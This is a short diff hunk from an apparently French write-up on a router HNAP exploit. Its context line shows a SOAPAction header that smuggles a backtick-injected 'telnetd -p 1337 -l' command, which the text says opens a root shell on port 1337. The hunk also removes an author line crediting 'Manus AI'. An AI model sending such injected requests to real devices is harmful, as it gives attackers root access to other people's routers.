@@ -68,4 +68,3 @@ SOAPAction: "http://purenetworks.com/HNAP1/GetDeviceSettings/`telnetd -p 1337 -l
 Cette requête force le routeur à ouvrir un shell root sur le port 1337.
 
 ---
-**Auteur :** Manus AI
